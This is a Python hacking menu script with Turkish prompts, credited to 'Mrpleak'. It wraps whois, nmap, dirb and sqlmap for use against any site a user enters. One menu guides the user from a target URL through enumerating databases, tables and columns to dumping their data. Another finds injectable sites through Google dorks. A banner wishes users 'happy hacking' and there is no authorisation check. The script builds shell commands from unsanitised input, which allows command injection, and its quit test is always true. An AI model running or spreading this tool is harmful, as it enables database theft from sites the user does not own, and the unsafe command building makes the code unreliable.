#!usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time

os.system("apt install cowsay")
os.system("clear")
os.system("cowsay -f skeleton back world")

taramalist = """
                                                                                                                                 
      +---------------------------------------------------+                                                           
      +                  Tarama listesi                   +                                                           
      +---------------------------------------------------+                                                           
"""                                                                                                                  
secim = """\033[93m
#MRPLEAK TARAFINDAN KODLANDI

 [0]  Kurulum
 [1]  Temel Keşif
 [2]  NMAP Port Tarama
 [3]  Eğitimler
 [4]  Sql Tarama
 [5]  Sql Site bulma
 [6]  Dirb
 [7]  Yapımcı Hakkında Bilgiler                                                                  
 [Q]  Çıkış
"""
print(taramalist)
print(secim)
secim = input("Seçim yapın: ")

if secim == "0":
	os.system("apt install cowsay")
	os.system("apt install nslookup")
	os.system("clear")

elif secim == "1":
	site = input("Site girin: ")
	os.system("clear")
	os.system("whois "+site)
	os.system("nslookup "+site)

elif secim == "2":
	site = input("Site girin: ")
	os.system("clear")
	os.system("nmap "+site)

elif secim == "3":
	print("https://justpaste.it/websitee")

elif secim == "4":
	os.system("clear")
	print("""
     
                  ***************************************************
                  *      Bu yazılım sistemlere zarar verebilir!!    *
                  *                                                 *
                  * sqlmapproject ,Mrpleak verilen hasardan sorumlu *
                  * değildir.                                       *
                  *            HEPİNİZE İYİ HACKLEMELER             *
                  *                                                 *
                  *           ☪                         ☪          *
                  ***************************************************
     
     
     [---]                         SQL Injection aracı                           [---]
     [---]                                                                       [---]
     [---]        sqlmapproject kişisinin sqlmap yazılımını kullanmaktadır       [---]
     [---]                                                                       [---]
     [---]          Mrpleak  taradından kodlandı ve kolaylaştırıldı              [---]                                 
     [---]             							    	 [---]
     [---]                             Mrpleak  	                    	 [---]
     
     Lütfen 1 den başlayıp 4 de kadar teker teker ilerleyiniz
     
     1.adım-Sitenin veri tabanları
     2.adım-Veri tabanının içindeki tablolar
     3.adım-Tabloların içindeki sütunlar
     4.adım-Bilgileri sonuçlama
     5.adım-Çıkış
     
""")
	sec = input("Seçim yapınız: ")
	if sec == "1":
		site0 = input("Siteyi giriniz: ")
		os.system('sqlmap -u"' + site0 + '" --dbs')
	elif sec == "2":
		site2 = input("Siteyi giriniz: ")
		veri_tabani = input("Database ismi girin: ")
		os.system('sqlmap -u"' + site2 + '" -D ' + veri_tabani + ' --tables')
	elif sec == "3":
		site3 = input("Siteyi giriniz: ")
		veri_tabani2 = input("Database ismi girin: ")
		tablo = input("Tablo ismi girin: ")
		os.system('sqlmap -u"' + site3 + '" -D ' + veri_tabani2 + ' -T ' + tablo + ' --columns')
	elif sec == "4":
		site4 = input("Siteyi giriniz: ")
		veri_tabani3 = input("Database ismi girin: ")
		tablo2 = input("Tablo ismi girin: ")
		sonuc = input("Kolon Adı girin: ")
		os.system('sqlmap -u"' + site4 + '" -D ' + veri_tabani3 + ' -T ' + tablo2 + ' -C' + sonuc + ' --dump')
	elif sec == "5":
		os.system("clear")
		os.system("exit")

elif secim == "5":
	dork = input("Dork giriniz: ")
	os.system("clear")
	os.system("sqlmap -g " + dork)
elif secim == "6":
	site = input("Site girin: ")
	os.system("clear")
	os.system("dirb "+site)
elif secim == "7":
	print("Ben siber güvenlik,yazılım,network ve web security üzerinde çalışmalar yapan biriyim :)")
	time.sleep(3)
	print("https://www.instagram.com/mrpleak/")
elif secim == "q" or "Q":
	os.system("clear")
	os.system("exit")
else:
	print("Hatalı seçim!!!")
